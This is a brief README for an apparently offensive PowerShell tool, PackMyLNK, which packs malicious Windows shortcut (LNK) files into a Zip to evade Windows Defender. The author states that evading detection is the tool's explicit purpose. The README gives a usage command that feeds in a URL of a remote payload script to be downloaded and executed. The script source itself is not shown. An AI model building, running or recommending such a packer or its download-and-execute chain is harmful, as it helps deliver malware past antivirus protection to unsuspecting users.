# PackMyLNK
A simple Zip packer to bypass Windows Defender for malicious LNK files

This script takes a URL as input and embeds it into a classic kill chain using LNK files. I developed it with the explicit purpose of evading detection by Windows Defender.

## Usage
`.\PackMyLNK.ps1 -Url http://example.com/payload-to-execute.ps1`
